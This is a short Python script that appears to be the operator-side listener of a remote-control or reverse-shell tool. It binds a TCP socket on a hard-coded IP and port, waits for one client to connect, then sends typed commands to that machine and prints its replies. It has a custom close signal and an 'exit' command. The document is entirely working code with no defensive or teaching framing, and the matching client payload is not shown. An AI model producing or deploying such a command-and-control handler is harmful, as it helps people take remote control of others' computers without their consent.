import socket
import os
import time
import colorama as clr
import threading
#Replace with your ip
host='192.168.18.170'
port=1234
server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind((host,port))
print("Frontman scanning...")
server_socket.listen(1)
client_socket,address=server_socket.accept()
print(f"Connected to {address}!")

def recive():
        while True:
            reply=client_socket.recv(4096).decode('utf-8')
            if reply=="Closekey123!":
                print("Client is closing!!!!!")
            else:     
                print(reply)
            
rthread=threading.Thread(target=recive, daemon=True)
rthread.start()
try:
    while True:
        command=input("Enter a command: ")
        if command.lower()=="exit":
            client_socket.send(command.encode('utf-8'))
            reply=client_socket.recv(4096).decode('utf-8')
            break
        else:
            client_socket.send(command.encode('utf-8'))
    server_socket.close()
    client_socket.close()
    print(clr.Fore.RED+"Closed successfully!")
except KeyboardInterrupt:
     print("Shutting down server!")
     server_socket.close()
     client_socket.close()
